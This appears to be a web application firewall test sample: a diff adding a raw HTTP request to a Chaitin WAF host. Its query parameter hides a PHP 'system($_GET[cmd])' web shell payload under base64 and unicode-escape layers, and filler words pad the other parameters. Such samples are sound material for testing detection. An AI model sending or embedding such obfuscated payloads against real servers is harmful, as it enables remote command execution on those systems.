@@ -1,0 +1,13 @@
+GET /hypervisor/snapshot?false%20positive=subtle&migrate=tweak&pattern=initiative&anomaly=WwoiXHUwMDZkXHUwMDY5XHUwMDczXHUwMDYzXHUwMDY1XHUwMDZDXHUwMDZDXHUwMDYxXHUwMDZFXHUwMDY1XHUwMDZmXHUwMDc1XHUwMDczIiAsCnRydWUsCiJcdTAwM0NcdTAwM0ZcdTAwNzBcdTAwNjhcdTAwNzBcdTAwMjBcdTAwNzNcdTAwNzlcdTAwNzNcdTAwNzRcdTAwNjVcdTAwNmRcdTAwMjhcdTAwMjRcdTAwNUZcdTAwNDdcdTAwNDVcdTAwNTRcdTAwNUJcdTAwNjNcdTAwNmRcdTAwNjRcdTAwNURcdTAwMjlcdTAwM2IiICwJNDUKLCJcdTAwNjVcdTAwNzZcdTAwNjFcdTAwNkNcdTAwNzVcdTAwNjFcdTAwNzRcdTAwNjlcdTAwNmZcdTAwNmUiIF0N HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko
+Cookie: post-mortem=encryption; initiative=vice%20versa; SESSIONID=03c3826008ace18205c47e1ec04c66a73df5eb7c3c7b27a4e1358adfbf1c0ffc4539292984db0926b5dca0c01bfa8d1e
+
